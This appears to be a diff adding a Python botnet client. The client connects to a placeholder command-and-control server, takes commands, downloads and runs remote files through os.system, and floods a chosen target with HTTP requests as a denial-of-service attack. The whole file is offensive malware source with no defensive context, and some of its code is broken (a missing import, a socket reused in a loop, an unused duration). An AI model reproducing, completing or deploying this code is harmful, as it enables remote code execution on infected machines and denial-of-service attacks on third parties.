@@ -1,0 +1,44 @@
+import socket
+import os
+import time
+import random
+
+def connect_to_cnc():
+    # Replace with your C&C server address
+    cnc_server = 'cnc.example.com'
+    port = 1234
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((cnc_server, port))
+    return sock
+
+def download_and_execute(file_url, filename):
+    import requests
+    response = requests.get(file_url, stream=True)
+    if response.status_code == 200:
+        with open(filename, 'wb') as f:
+            for chunk in response.iter_content(1024):
+                f.write(chunk)
+        os.system(f'start /B {filename}')
+
+def perform_ddos(target_ip, port, duration):
+    import threading
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        sock.connect((target_ip, port))
+        sock.send(b'GET / HTTP/1.1\r\n\r\n')
+
+def main():
+    sock = connect_to_cnc()
+    while True:
+        command = sock.recv(1024).decode()
+        if command == 'download':
+            file_url, filename = sock.recv(1024).decode().split(',')
+            download_and_execute(file_url, filename)
+        elif command == 'ddos':
+            target_ip, port, duration = sock.recv(1024).decode().split(',')
+            threading.Thread(target=perform_ddos, args=(target_ip, int(port), float(duration))).start()
+        else:
+            print(f'Unknown command: {command}')
+
+if __name__ == '__main__':
+    main()
